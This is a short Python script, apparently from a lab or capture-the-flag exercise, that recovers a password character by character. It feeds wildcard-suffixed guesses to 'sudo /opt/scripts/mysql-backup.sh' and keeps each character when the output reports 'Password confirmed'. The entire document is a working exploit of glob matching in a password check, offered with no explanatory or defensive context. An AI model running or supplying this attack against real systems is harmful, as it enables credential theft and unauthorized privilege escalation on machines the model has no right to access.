import string
import subprocess
import time

all_characters = list(string.ascii_letters + string.digits)
password = ""
while True:
    for char in all_characters:
        command = f"echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed" in output:
            password += char
            print(password)
            time.sleep(1)